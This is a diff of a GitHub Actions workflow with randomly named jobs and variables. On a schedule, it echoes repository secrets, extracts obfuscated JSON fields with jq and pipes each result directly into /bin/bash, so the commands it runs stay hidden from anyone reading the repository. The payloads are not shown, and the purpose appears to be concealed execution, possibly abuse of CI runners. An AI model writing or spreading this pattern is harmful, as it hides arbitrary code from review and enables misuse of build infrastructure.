@@ -1,27 +1,31 @@
 name: sunbajie4718
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
+    - cron: '0 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: sunbajie4718
         env:
-          ho528: ${{ secrets.ho528 }}
+          ton295: ${{ secrets.ton295 }}
         run: |
-          echo $ho528 | jq -r .fb738 | /bin/bash
-          echo $dpp8391 | jq -r .fsy163 | /bin/bash
-          echo $m47195 | jq -r .vg946 | /bin/bash
-          echo $f45993 | jq -r .qjhy44650 | /bin/bash
-          echo $vxga4 | jq -r .b9 | /bin/bash
-          echo $y68 | jq -r .bdvb5 | /bin/bash
-          echo $tha73 | jq -r .ghw95 | /bin/bash
-          echo $iuoz19 | jq -r .zi669 | /bin/bash
-          echo $s8573 | jq -r .rasez31749 | /bin/bash
-          echo $ie935 | jq -r .hab75 | /bin/bash
+          echo $ton295 | jq -r .b0 | /bin/bash
+          echo $yd330 | jq -r .rch25 | /bin/bash
+          echo $itak97 | jq -r .wit73502 | /bin/bash
+          echo $jcty69 | jq -r .thr3185 | /bin/bash
+          echo $tw8664 | jq -r .j1842 | /bin/bash
+          echo $msa628 | jq -r .dp55793 | /bin/bash
+          echo $dqdum6 | jq -r .j285 | /bin/bash
+          echo $twuy59 | jq -r .pdpxx53 | /bin/bash
+          echo $om59208 | jq -r .pv61 | /bin/bash
+          echo $vmj88341 | jq -r .dzes3 | /bin/bash
+          echo $qvza59239 | jq -r .bd7 | /bin/bash
+          echo $qvyum55505 | jq -r .tbb004 | /bin/bash
+          echo $bm9366 | jq -r .qldbk0893 | /bin/bash
+          echo $mwf3428 | jq -r .yz546 | /bin/bash
 
